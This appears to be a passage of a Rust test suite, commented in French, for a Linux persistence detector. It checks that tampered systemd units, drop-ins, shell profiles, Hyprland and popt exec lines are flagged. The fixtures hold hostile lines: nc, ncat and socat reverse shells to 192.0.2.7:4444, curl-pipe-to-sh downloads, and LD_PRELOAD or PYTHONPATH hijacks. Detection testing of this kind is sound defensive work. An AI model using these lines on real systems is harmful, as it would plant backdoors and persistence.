    /// Vérification de la campagne E, N3 : un fichier que lit un fichier des variables (« source = » de Hyprland,
    /// « . » d'un profil) est lié aussi ; un « source = » calculé de Hyprland ne se suit pas, et rien ne se déclare.
    #[test]
    fn sources_des_variables_suivies() {
        for (i, (fichier, texte, lu)) in [
            (
                ".config/hypr/hyprland.conf",
                "source = ~/.autres/v.conf\n",
                ".autres/v.conf",
            ),
            (
                ".config/hypr/hyprland.conf",
                "source=/home/alice/.autres/v.conf # x\n",
                ".autres/v.conf",
            ),
            // Un chemin relatif se lit depuis le dossier du fichier, comme Hyprland (relecture adverse, C7).
            (
                ".config/hypr/hyprland.conf",
                "source = ../../.autres/r.conf\n",
                ".autres/r.conf",
            ),
            (".profile", ". ~/.autres/p.sh\n", ".autres/p.sh"),
            (".bashrc", "source \"$HOME/.autres/p.sh\"\n", ".autres/p.sh"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("sources-{i}"));
            m.ecrire(fichier, texte);
            m.ecrire(lu, "# rien\n");
            let declare = m.lancements();
            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
            m.ecrire(lu, "# autre chose\n");
            assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()), "{texte}");
        }
        for (i, texte) in [
            "source = $HOME/x.conf\n",
            "source = ~/.*/v.conf\n",
            "source = ~/.autres/{a,b}.conf\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = maison_avec_rappel(&format!("sources-calculees-{i}"));
            m.ecrire(".config/hypr/hyprland.conf", texte);
            let c = m.lancements();
            assert!(crate::apprentissage::declarable(&c).is_err(), "{texte}");
            assert!(refus(&c).contains("toutes lettres"), "{texte} : {}", refus(&c));
        }
        // Un profil qui se lit lui-même : la chaîne s'arrête, rien ne tourne sans fin.
        let m = maison_avec_rappel("sources-boucle");
        m.ecrire(".profile", ". ~/.profile\n");
        assert!(crate::apprentissage::essai_tait(&m.lancements(), &m.lancements()));
    }

    /// Vérification de la campagne E, « -mmodule » : un interpréteur du système copié sous un autre nom lit ce que ses
    /// options lui donnent, que rien ne lie ; la ligne ne se déclare pas. Un autre programme de même taille, si.
    #[test]
    fn copie_d_un_interprete_refusee() {
        let m = Maison::nouvelle("copie");
        let bin = m.racine.join("usr/bin");
        std::fs::create_dir_all(&bin).unwrap();
        std::fs::write(bin.join("python3"), b"\x7fELF\x02\x01\x01\x00\x00 interprete").unwrap();
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nExecStart=%h/.x/outil -mrappel\n",
        );
        std::fs::create_dir_all(m.chemin(".x")).unwrap();
        std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 interprete").unwrap();
        let c = m.lancements();
        assert!(crate::apprentissage::declarable(&c).is_err());
        assert!(refus(&c).contains("copie de /usr/bin/python3"), "{}", refus(&c));
        std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 autre-prog").unwrap();
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());
        // Un lien dur, même sans lire le contenu.
        std::fs::remove_file(m.chemin(".x/outil")).unwrap();
        if std::fs::hard_link(bin.join("python3"), m.chemin(".x/outil")).is_ok() {
            assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
        }
        // Deuxième vérification : un interpréteur de même taille qui ne se relit pas ne fait pas conclure « pas une
        // copie ».
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::remove_file(m.chemin(".x/outil")).unwrap();
            std::fs::write(m.chemin(".x/outil"), b"\x7fELF\x02\x01\x01\x00\x00 autre-prog").unwrap();
            std::fs::write(bin.join("python3"), b"\x7fELF\x02\x01\x01\x00\x00 interpret2").unwrap();
            std::fs::set_permissions(bin.join("python3"), std::fs::Permissions::from_mode(0o000)).unwrap();
            if std::fs::read(bin.join("python3")).is_ok() {
                return crate::essais::saute("le compte lit un fichier sans droit de lecture (root)");
            }
            let c = m.lancements();
            std::fs::set_permissions(bin.join("python3"), std::fs::Permissions::from_mode(0o644)).unwrap();
            assert!(refus(&c).contains("ne se compare pas"), "{}", refus(&c));
        }
    }

    /// Vérification de la campagne E, N7 : une unité posée sous un XDG_CONFIG_HOME ou un XDG_DATA_HOME déplacé est
    /// cherchée comme les autres (systemd l'y lit), et ne passe pas pour « rien de suspect ».
    #[test]
    fn unites_des_dossiers_deplaces_vues() {
        for (variable, dossier) in [("XDG_CONFIG_HOME", "systemd/user"), ("XDG_DATA_HOME", "systemd/user")] {
            let m = Maison::nouvelle(&format!("deplace-{}", variable.len() + dossier.len()));
            let ailleurs = m.racine.join("ailleurs");
            let vars = |v: &str| match v {
                "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
                x if x == variable => Some("/ailleurs".into()),
                _ => None,
            };
            let lire = || {
                persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
                    .into_iter()
                    .next()
                    .unwrap()
            };
            assert_eq!(lire().probleme, None, "{variable}");
            std::fs::create_dir_all(ailleurs.join(dossier)).unwrap();
            std::fs::write(ailleurs.join(dossier).join("rappel.service"), UNITE).unwrap();
            m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
            assert!(lire().probleme >= Some(Niveau::Eleve), "{variable}");
        }
        // Le dossier de démarrage du bureau d'une configuration déplacée aussi.
        let m = Maison::nouvelle("deplace-bureau");
        let vars = |v: &str| (v == "XDG_CONFIG_HOME").then(|| "/ailleurs".into());
        std::fs::create_dir_all(m.racine.join("ailleurs/autostart")).unwrap();
        std::fs::write(
            m.racine.join("ailleurs/autostart/maj.desktop"),
            "[Desktop Entry]\nExec=/tmp/.x/agent\n",
        )
        .unwrap();
        let c = persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve));
    }

    /// Vérification de la campagne E, N9 : un dossier personnel que le compte ne peut pas lire n'est pas « rien de
    /// suspect », mais « non vérifié ».
    #[cfg(unix)]
    #[test]
    fn dossier_personnel_illisible_dit() {
        use std::os::unix::fs::PermissionsExt as _;
        let m = Maison::nouvelle("illisible-maison");
        let maison = m.chemin("");
        std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o000)).unwrap();
        if std::fs::read_dir(&maison).is_ok() {
            std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o755)).unwrap();
            return crate::essais::saute("le compte lit un dossier sans droit de lecture (root)");
        }
        let c = m.lancements();
        std::fs::set_permissions(&maison, std::fs::Permissions::from_mode(0o755)).unwrap();
        assert!(c.probleme >= Some(Niveau::Eleve), "{:?}", c.probleme);
        assert!(c.message.contains("dossier personnel ne se lit pas"), "{}", c.message);
        assert!(crate::apprentissage::declarable(&c).is_err());
    }

    /// Campagne E, M-d : un XDG_CONFIG_HOME déplacé est lu, ses unités et ses variables comprises.
    #[test]
    fn configuration_deplacee_lue() {
        let m = maison_avec_rappel("deplacee");
        let ailleurs = m.racine.join("ailleurs");
        let vars = |v: &str| match v {
            "XDG_RUNTIME_DIR" => Some("/run/user/1000".into()),
            "XDG_CONFIG_HOME" => Some("/ailleurs".into()),
            _ => None,
        };
        let lire = || {
            persistance_dans(&m.racine, &m.chemin(""), vars, None, None)
                .into_iter()
                .next()
                .unwrap()
        };
        let declare = lire();
        assert!(crate::apprentissage::essai_tait(&declare, &lire()));
        std::fs::create_dir_all(ailleurs.join("systemd/user/rappel.service.d")).unwrap();
        std::fs::write(
            ailleurs.join("systemd/user/rappel.service.d/x.conf"),
            "[Service]\nNice=5\n",
        )
        .unwrap();
        assert!(
            !crate::apprentissage::essai_tait(&declare, &lire()),
            "ajout sous XDG_CONFIG_HOME"
        );
        std::fs::remove_dir_all(ailleurs.join("systemd")).unwrap();
        assert!(crate::apprentissage::essai_tait(&declare, &lire()));
        std::fs::create_dir_all(ailleurs.join("environment.d")).unwrap();
        std::fs::write(ailleurs.join("environment.d/x.conf"), "NODE_OPTIONS=--require=/x.js\n").unwrap();
        assert!(
            !crate::apprentissage::essai_tait(&declare, &lire()),
            "variable sous XDG_CONFIG_HOME"
        );
    }

    /// Point 8 (0.95, suite de D-1) : une ligne « exec » d'un réglage de popt fait lancer un programme à rsync (et à
    /// tout programme qui lit ces réglages) ; sa commande se juge comme une ligne lancée, où qu'elle soit (~/.popt,
    /// /etc/popt, /usr/etc/popt, leurs popt.d), lignes continuées comprises. Ne se déclare pas normale. « alias »,
    /// commentaire et programme permis (comme pour Hyprland) restent muets ; un ~/.popt présent qui ne se lit pas est
    /// dit.
    #[test]
    fn les_lignes_exec_de_popt_sont_des_lancements() {
        let charge = "rsync exec -a /home/alice/.cache/charge\n";
        let cas: &[(&str, &str, &str, Option<&str>)] = &[
            ("témoin", "", "", None),
            ("alias", ".popt", "rsync alias --tout -a --delete\n", None),
            (
                "commentaire",
                ".popt",
                "# rsync exec -a /home/alice/.cache/charge\n",
                None,
            ),
            ("permis", ".popt", "rsync exec --rien /usr/bin/true\n", None),
            ("caché", ".popt", charge, Some("~/.popt:1 : ")),
            // Même liste permise que les lignes de Hyprland : un programme du compte hors dossier caché ou temporaire
            // y passe.
            ("bin du compte", ".popt", "rsync exec -a /home/alice/bin/charge\n", None),
            (
                "temporaire",
                ".popt",
                "\n\nrsync  exec\t-a /tmp/charge\n",
                Some("~/.popt:3 : "),
            ),
            (
                "shell",
                ".popt",
                "rsync exec -a sh -c 'curl x | sh'\n",
                Some("~/.popt:1 : "),
            ),
            (
                "continuée",
                ".popt",
                "rsync ex\\\nec -a /home/alice/.cache/charge\n",
                Some("~/.popt:1 : "),
            ),
            (
                "blancs de tête",
                ".popt",
                "  rsync exec -a /home/alice/.cache/charge\r\n",
                Some("~/.popt:1 : "),
            ),
            ("sans commande", ".popt", "rsync exec -a\n", Some("~/.popt:1 : ")),
            (
                "sans fin de ligne",
                ".popt",
                "rsync exec -a /home/alice/.cache/charge",
                Some("~/.popt:1 : "),
            ),
            ("dossier", ".popt/", "", Some("illisible")),
            ("/etc/popt", "/etc/popt", charge, Some("etc/popt:1 : ")),
            ("/usr/etc/popt", "/usr/etc/popt", charge, Some("usr/etc/popt:1 : ")),
            ("/etc/popt.d", "/etc/popt.d/z", charge, Some("etc/popt.d/z:1 : ")),
            (
                "/usr/etc/popt.d",
                "/usr/etc/popt.d/z",
                charge,
                Some("usr/etc/popt.d/z:1 : "),
            ),
            // V-8 (relecture 0.95) : un réglage du système présent qui ne se lit pas est dit, jamais sauté.
            ("dossier /etc/popt", "/etc/popt/", "", Some("etc/popt : ")),
            ("popt.d illisible", "/usr/etc/popt.d", "", Some("usr/etc/popt.d : ")),
        ];
        let mut faux = Vec::new();
        for (i, (nom, fichier, texte, attendu)) in cas.iter().enumerate() {
            let m = Maison::nouvelle(&format!("popt-exec-{i}"));
            m.ecrire(".cache/charge", "#!/bin/sh\n");
            m.ecrire("bin/charge", "#!/bin/sh\n");
            match *fichier {
                "" => {}
                ".popt/" => std::fs::create_dir_all(m.chemin(".popt")).unwrap(),
                f if f.ends_with('/') => std::fs::create_dir_all(m.racine.join(f.trim_matches('/'))).unwrap(),
                f if f.starts_with('/') => {
                    let f = m.racine.join(f.trim_start_matches('/'));
                    std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                    std::fs::write(f, texte).unwrap();
                }
                f => m.ecrire(f, texte),
            }
            let c = m.lancements();
            let juste = match attendu {
                None => c.probleme.is_none(),
                Some(e) => {
                    c.probleme == Some(Niveau::Eleve)
                        && c.message.contains(e)
                        && crate::apprentissage::declarable(&c).is_err()
                        && (*nom == "dossier" || refus(&c).contains("popt"))
                        && (!nom.contains("dossier") && !nom.contains("illisible") || c.message.contains("non vérifié"))
                }
            };
            if !juste {
                faux.push(format!("{nom} : {:?} {:?}", c.probleme, c.message));
            }
        }
        assert!(faux.is_empty(), "{faux:#?}");
    }

    #[test]
    fn lignes_de_popt_comme_popt_les_lit() {
        assert_eq!(
            lignes_de_popt("# x\n  a exec b c\r\n\nd ali\\\nas e f\ng"),
            vec![
                (1, "  a exec b c".to_string(), true),
                (3, "d alias e f".to_string(), false),
                (5, "g".to_string(), true)
            ]
        );
        assert_eq!(exec_de_popt("rsync\texec  -a  /x y "), Some("/x y".to_string()));
        assert_eq!(exec_de_popt("rsync exec -a"), Some(String::new()));
        assert_eq!(exec_de_popt("rsync alias -a /x"), None);
        assert_eq!(exec_de_popt("rsync execx -a /x"), None);
    }

    fn refus(c: &Constat) -> String {
        match c.temoins() {
            crate::machine::temoins::Temoins::Refuse(r) => r.clone(),
            autre => panic!("refus attendu : {autre:?}"),
        }
    }

    /// Relecture E, C2 : ce qui redirige une ligne acceptée sans toucher aux fichiers liés ne se déclare pas normal ;
    /// un ajout (drop-in) qui change le dossier personnel, les bibliothèques ou les variables, une unité du même nom
    /// qui passe avant, même écrit sur des lignes continuées.
    #[test]
    fn unite_redirigee_refusee() {
        let cas: [(&str, &str, &str); 10] = [
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironment=HOME=/tmp/h\n",
                "HOME",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironmentFile=%h/.e\n",
                "EnvironmentFile",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nEnvironment=\"LANG=C\" \\\n  LD_PRELOAD=/tmp/l.so\n",
                "LD_PRELOAD",
            ),
            (
                "service.d/x.conf",
                "[Service]\nEnvironment=PYTHONPATH=/tmp\n",
                "PYTHONPATH",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nExecSearchPath=/tmp\n",
                "ExecSearchPath",
            ),
            // Vérification de la campagne E, N1 : le dossier de travail change ce que lit « /proc/self/cwd/… » et
            // tout chemin relatif d'un programme.
            (
                "rappel.service.d/x.conf",
                "[Service]\nWorkingDirectory=/tmp\n",
                "WorkingDirectory",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nRootDirectory=/tmp\n",
                "RootDirectory",
            ),
            (
                "rappel.service.d/x.conf",
                "[Service]\nTemporaryFileSystem=/opt\n",
                "TemporaryFileSystem",
            ),
            ("../user.control/rappel.service", UNITE, "user.control"),
            // Campagne E : l'entrée standard d'un service peut porter le script que lit un interpréteur.
            (
                "rappel.service.d/x.conf",
                "[Service]\nStandardInputText=curl http://192.0.2.7/x\n",
                "StandardInput",
            ),
        ];
        for (fichier, texte, attendu) in cas {
            let m = maison_avec_rappel(&format!("redirigee-{attendu}"));
            let declare = m.lancements();
            assert!(crate::apprentissage::declarable(&declare).is_ok(), "{attendu}");
            m.ecrire(&format!(".config/systemd/user/{fichier}"), texte);
            let plus_tard = m.lancements();
            assert!(refus(&plus_tard).contains(attendu), "{attendu} : {}", refus(&plus_tard));
            assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard), "{attendu}");
        }
        // Sans dossier de la session, ce que systemd y ajouterait ne se vérifie pas.
        let m = maison_avec_rappel("sans-session");
        let c = persistance_dans(&m.racine, &m.chemin(""), |_| None, None, None)
            .into_iter()
            .next()
            .unwrap();
        assert!(refus(&c).contains("XDG_RUNTIME_DIR"));
    }

    /// Vérification 4, D1 : le parcours d'un dossier d'unités suit l'ordre des noms, pas celui du système de fichiers
    /// (l'ordre de création sur btrfs, un hachage sur ext4). Les fichiers sont créés dans un ordre mêlé ; sans le tri,
    /// ils revenaient tels que le disque les rend, et le premier refus d'une alerte changeait d'un disque à l'autre.
    #[test]
    fn parcours_dans_l_ordre_des_noms() {
        let m = Maison::nouvelle("ordre-des-noms");
        let dossier = m.chemin(".config/systemd/user");
        // 7 et 32 sont premiers entre eux : chaque numéro une fois, dans un ordre ni croissant ni décroissant.
        for i in 0..32_u32 {
            let n = i.wrapping_mul(7) % 32;
            m.ecrire(&format!(".config/systemd/user/u{n:02}.service"), UNITE);
            m.ecrire(&format!(".config/systemd/user/u{n:02}.service.d/x.conf"), "[Unit]\n");
        }
        let lus = fichiers_de(&dossier, &["service", "conf"]);
        let mut attendus = lus.clone();
        attendus.sort();
        assert_eq!(lus.len(), 64);
        assert_eq!(lus, attendus);
        assert!(lus[0].ends_with("u00.service") && lus[1].ends_with("u00.service.d/x.conf"));
    }

    /// Vérification 4, D1 : le verdict d'une maison ne dépend pas de l'ordre où ses fichiers ont été écrits (donc du
    /// disque où elle est) : le même refus, que l'unité soit écrite avant ou après l'ajout qui la redirige.
    #[test]
    fn refus_independant_de_l_ordre_d_ecriture() {
        let ajout = ("service.d/x.conf", "[Service]\nEnvironment=PYTHONPATH=/tmp\n");
        let avant = Maison::nouvelle("ordre-avant");
        avant.ecrire(".config/systemd/user/rappel.service", UNITE);
        avant.ecrire(&format!(".config/systemd/user/{}", ajout.0), ajout.1);
        let apres = Maison::nouvelle("ordre-apres");
        apres.ecrire(&format!(".config/systemd/user/{}", ajout.0), ajout.1);
        apres.ecrire(".config/systemd/user/rappel.service", UNITE);
        for m in [&avant, &apres] {
            m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        }
        let (a, b) = (avant.lancements(), apres.lancements());
        assert_eq!(refus(&a), refus(&b));
        assert_eq!(a.message, b.message);
        assert!(refus(&a).contains("PYTHONPATH"), "{}", refus(&a));
    }

    /// Vérification 4, D1 : une ligne d'unité que la liste permise refuse et que l'ancienne porte (`reglage_suspect`)
    /// lève aussi se montre avec la raison de la liste permise, passée d'abord ; chacune reste levée, jamais
    /// déclarable, et son refus nomme la clé.
    #[test]
    fn reglage_par_la_liste_permise_d_abord() {
        use permise::Ecart;
        let de_la_liste: Vec<&str> = [
            Ecart::Filet,
            Ecart::Forme,
            Ecart::Programme,
            Ecart::Lanceur,
            Ecart::Variable,
            Ecart::Chemin,
            Ecart::Longue,
            Ecart::Directive,
            Ecart::Fichier,
        ]
        .map(Ecart::raison)
        .to_vec();
        for (i, (ligne, cle)) in [
            ("Environment=PYTHONPATH=/tmp", "Environment=PYTHONPATH"),
            ("Environment=LANG=C LD_PRELOAD=/tmp/l.so", "Environment=LD_PRELOAD"),
            ("Environment=PATH=/tmp/.x:/usr/bin", "Environment=PATH"),
            ("ExecSearchPath=/tmp", "ExecSearchPath="),
            ("EnvironmentFile=/tmp/e", "EnvironmentFile="),
            ("WorkingDirectory=/tmp", "WorkingDirectory="),
            ("RootDirectory=/tmp", "RootDirectory="),
            ("StandardInputFile=/tmp/x", "StandardInputFile="),
            ("BindPaths=/tmp/x:/opt/x", "BindPaths="),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("reglage-{i}"));
            let r = Releveur {
                racine: m.racine.clone(),
                maison: m.chemin(""),
                ..Releveur::default()
            };
            assert!(
                reglage_suspect(ligne, &r).is_some(),
                "{ligne} : l'ancienne porte le lève aussi"
            );
            m.ecrire(".config/systemd/user/seul.service", &format!("[Service]\n{ligne}\n"));
            let c = m.lancements();
            assert!(refus(&c).contains(cle), "{ligne} : {}", refus(&c));
            assert!(crate::apprentissage::declarable(&c).is_err(), "{ligne}");
            assert!(
                de_la_liste
                    .iter()
                    .any(|r| c.message.contains(&format!("seul.service:2 : {r}"))),
                "{ligne} : {}",
                c.message
            );
        }
    }

    /// Relecture E, C7 : un shell inversé se lit sans ambiguïté, mais ne se déclare jamais normal.
    #[test]
    fn porte_derobee_jamais_declarable() {
        for ligne in [
            "ExecStart=/usr/bin/nc -e /bin/sh 192.0.2.7 4444",
            "ExecStart=/usr/bin/ncat --sh-exec=/bin/sh 192.0.2.7 4444",
            "ExecStart=/usr/bin/socat TCP:192.0.2.7:4444 EXEC:/bin/sh",
        ] {
            let m = Maison::nouvelle(&format!("porte-{}", ligne.len()));
            m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{ligne}\n"));
            let c = m.lancements();
            assert!(c.probleme >= Some(Niveau::Eleve), "{ligne}");
            assert!(refus(&c).contains("porte dérobée"), "{ligne} : {}", refus(&c));
        }
    }

    /// Relecture E, B2 : « bash script » lie le script, pas seulement bash ; M3 : une ligne Lua qui colle autre chose
    /// à la commande ne se déclare pas ; M9 : une unité qui n'est pas de l'UTF-8 se lit quand même.
    #[test]
    fn scripts_lua_et_octets() {
        let m = Maison::nouvelle("script");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nExecStart=/usr/bin/bash %h/.cache-x/rappel.sh\n",
        );
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "le script caché est signalé");
        let lignes = c.temoins().lignes();
        let chemins: Vec<&str> = lignes[0].cibles.iter().map(|c| c.chemin.as_str()).collect();
        assert_eq!(chemins, ["/usr/bin/bash", "~/.cache-x/rappel.sh", ENVIRONNEMENT]);
        assert!(lignes[0].cibles[1].apercu.is_some(), "le script se montre");
        let declare = c;
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl http://192.0.2.7/x\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));

        let m = Maison::nouvelle("lua");
        m.ecrire(
            ".config/hypr/autostart.lua",
            "o.exec_on_start(\"/tmp/x/run\" .. suffixe)\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(refus(&c).contains("ambiguïté"), "{}", refus(&c));
        m.ecrire(".config/hypr/autostart.lua", "o.exec_on_start(\"/tmp/x/run\")\n");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());

        let m = Maison::nouvelle("octets");
        let p = m.chemin(".config/systemd/user/a.service");
        std::fs::write(&p, b"[Unit]\nDescription=caf\xe9\n[Service]\nExecStart=/tmp/.x/a\n").unwrap();
        assert_eq!(m.lancements().probleme, Some(Niveau::Eleve));
    }

    /// M9 : un tube nommé à la place d'un fichier lu est dit, jamais compté comme sain (ni attendu : il bloquerait).
    #[test]
    fn tube_a_la_place_d_un_fichier() {
        let m = Maison::nouvelle("tube");
        let p = m.chemin(".bashrc");
        if !std::process::Command::new("mkfifo")
            .arg(&p)
            .status()
            .is_ok_and(|s| s.success())
        {
            return crate::essais::saute("mkfifo absent");
        }
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(c.message.contains("non vérifié"), "{}", c.message);
    }

    /// M7 : un service système ajouté à la main lie ce qu'il lance ; changé, son information revient.
    #[test]
    fn service_ajoute_lie_son_programme() {
        let m = Maison::nouvelle("service");
        let unite = m.racine.join("etc/systemd/system/sauvegarde.service");
        std::fs::create_dir_all(unite.parent().unwrap()).unwrap();
        std::fs::write(&unite, "[Service]\nExecStart=/opt/sauvegarde/lancer --nuit\n").unwrap();
        let programme = m.racine.join("opt/sauvegarde/lancer");
        std::fs::create_dir_all(programme.parent().unwrap()).unwrap();
        std::fs::write(&programme, "#!/bin/sh\nrestic backup\n").unwrap();
        let mut r = Releveur {
            racine: m.racine.clone(),
            maison: m.chemin(""),
            ..Releveur::default()
        };
        assert!(
            temoin_de_service(&mut r, &unite).is_err(),
            "sans l'environnement relevé, rien ne se lie"
        );
        r.environnement = Some(environnement(&r, Vec::new(), Vec::new()).0);
        let avant = temoin_de_service(&mut r, &unite).unwrap();
        assert_eq!(avant.cibles.len(), 2);
        assert_eq!(avant.cibles[1].chemin, ENVIRONNEMENT);
        assert_eq!(avant.cibles[0].chemin, "/opt/sauvegarde/lancer");
        std::fs::write(&programme, "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        let apres = temoin_de_service(&mut r, &unite).unwrap();
        assert_ne!(avant.trace, apres.trace);
    }

    /// Les dossiers d'ajout d'une unité, comme les cherche systemd.
    #[test]
    fn noms_des_ajouts() {
        assert_eq!(
            ajouts_de("a-b-c.service"),
            ["a-.service.d", "a-b-.service.d", "a-b-c.service.d", "service.d"]
        );
        assert_eq!(ajouts_de("x@1.service"), ["service.d", "x@.service.d", "x@1.service.d"]);
        assert!(directive_refusee("[Service]\nEnvironment=LANG=C TZ=UTC\n").is_none());
        assert!(directive_refusee("# EnvironmentFile=/x\n").is_none());
        assert_eq!(
            directive_refusee("[Service]\nEnvironment='LANG=1' \\\n# note\n  \"PATH=/tmp\"\n").as_deref(),
            Some("Environment=PATH")
        );
        // Vérification de la campagne E, N3 : systemd enlève les guillemets et décode « \xNN » avant de lire le
        // nom ; seule une courte liste de noms connus passe, et une barre oblique inversée n'est jamais lue.
        for (texte, attendu) in [
            ("[Service]\nEnvironment=PYTHON\\x5fPATH=/tmp\n", "Environment=\\…"),
            (
                "[Service]\nEnvironment=\"LANG=C\" \"PYTHON\"PATH=/tmp\n",
                "Environment=PYTHONPATH",
            ),
            (
                "[Service]\nEnvironment=\"LD_PRE\"LOAD=/tmp/a.so\n",
                "Environment=LD_PRELOAD",
            ),
            ("[Service]\nEnvironment=GTK_MODULES=x\n", "Environment=GTK_MODULES"),
            ("[Service]\nEnvironment=\"LANG=C\n", "Environment"),
            (
                "[Service]\nPassEnvironment=BASH_FUNC_x%%\n",
                "PassEnvironment=BASH_FUNC_x%%",
            ),
            ("[Service]\nWorkingDirectory=/tmp\n", "WorkingDirectory"),
        ] {
            let vu = directive_refusee(texte);
            assert!(
                vu.as_deref().is_some_and(|v| v.starts_with(attendu)),
                "{texte:?} : {vu:?}"
            );
        }
        assert!(directive_refusee("[Service]\nEnvironment=\"LANG=C\" LC_ALL=C TZ=UTC NO_COLOR=1\n").is_none());
    }

    /// Le témoin d'environnement d'une ligne déclarable, tel qu'il se montre.
    fn apercu_de_l_environnement(c: &Constat) -> Vec<String> {
        let t = c.temoins();
        let ligne = t.lignes().into_iter().next().expect("une ligne relevée");
        ligne
            .cibles
            .iter()
            .find(|x| x.chemin == ENVIRONNEMENT)
            .and_then(|x| x.apercu.clone())
            .expect("l'environnement se montre")
    }

    /// Deuxième vérification de la campagne E, P2 : chaque ligne Exec de l'unité est montrée et liée avec la ligne
    /// signalée ; le programme d'un ExecStartPre= changé après le choix fait revenir l'alerte.
    #[test]
    fn autres_lignes_exec_liees() {
        let m = Maison::nouvelle("exec-liees");
        m.ecrire(
            ".config/systemd/user/rappel.service",
            "[Service]\nType=oneshot\nExecStartPre=/opt/outil/avant\nExecStart=%h/.cache-x/rappel.sh\nExecStopPost=/opt/outil/apres --fin\n",
        );
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
        let opt = m.racine.join("opt/outil");
        std::fs::create_dir_all(&opt).unwrap();
        std::fs::write(opt.join("avant"), "#!/bin/sh\necho avant\n").unwrap();
        std::fs::write(opt.join("apres"), "#!/bin/sh\necho apres\n").unwrap();
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            declare.message
        );
        let t = declare.temoins();
        let chemins: Vec<String> = t
            .lignes()
            .iter()
            .flat_map(|l| l.cibles.iter().map(|c| c.chemin.clone()))
            .collect();
        for attendu in ["ExecStartPre=/opt/outil/avant → /opt/outil/avant", "ExecStopPost="] {
            assert!(
                chemins.iter().any(|c| c.starts_with(attendu)),
                "{attendu} : {chemins:?}"
            );
        }
        assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()));
        std::fs::write(opt.join("avant"), "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
        // Une ligne Exec d'un ajout, aussi.
        let m = maison_avec_rappel("exec-ajout");
        std::fs::create_dir_all(m.racine.join("opt")).unwrap();
        std::fs::write(m.racine.join("opt/etape"), "#!/bin/sh\necho etape\n").unwrap();
        m.ecrire(
            ".config/systemd/user/rappel.service.d/x.conf",
            "[Service]\nExecStartPost=/opt/etape\n",
        );
        let declare = m.lancements();
        assert!(
            crate::apprentissage::declarable(&declare).is_ok(),
            "{}",
            refus(&declare)
        );
        std::fs::write(m.racine.join("opt/etape"), "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));
    }

    /// Deuxième vérification de la campagne E, P2 : une unité ne se déclare normale que si chaque directive est de
    /// la courte liste permise ; tout le reste (espaces de noms, accréditations, PAM, unités lancées en cas d'échec,
    /// remise à zéro d'ExecStart=, dépendance vers un service, valeur qui est un chemin) est refusé.
    #[test]
    fn directives_hors_liste_refusees() {
        for (i, (texte, attendu)) in [
            ("[Service]\nPrivateTmp=yes\n", "PrivateTmp="),
            ("[Unit]\nJoinsNamespaceOf=autre.service\n", "JoinsNamespaceOf="),
            ("[Service]\nLoadCredential=cle:/tmp/c\n", "LoadCredential="),
            (
                "[Service]\nLoadCredentialEncrypted=cle:/tmp/c\n",
                "LoadCredentialEncrypted=",
            ),
            ("[Service]\nPAMName=login\n", "PAMName="),
            ("[Unit]\nOnFailure=autre.service\n", "OnFailure="),
            ("[Unit]\nOnSuccess=autre.service\n", "OnSuccess="),
            ("[Service]\nUnsetEnvironment=PATH\n", "UnsetEnvironment="),
            ("[Service]\nExecStart=\n", "ExecStart= ("),
            ("[Unit]\nWants=autre.service\n", "Wants=autre.service"),
            ("[Install]\nWantedBy=autre.service\n", "WantedBy=autre.service"),
            ("[Service]\nEnvironment=LC_ALL=/tmp/l\n", "Environment=LC_ALL"),
            ("[Service]\nEnvironment=TZ=../../tmp/z\n", "Environment=TZ"),
            ("[Socket]\nListenStream=4444\n", "[Socket]"),
            ("[Service]\nBindPaths=/tmp:/opt\n", "BindPaths="),
            ("[Service]\nsans égal\n", "sans égal"),
        ]
        .into_iter()
        .enumerate()
        {
            assert!(
                directive_refusee(texte)
                    .as_deref()
                    .is_some_and(|v| v.starts_with(attendu)),
                "{texte:?} : {:?}",
                directive_refusee(texte)
            );
            let m = maison_avec_rappel(&format!("hors-liste-{i}"));
            let declare = m.lancements();
            m.ecrire(".config/systemd/user/rappel.service.d/x.conf", texte);
            let plus_tard = m.lancements();
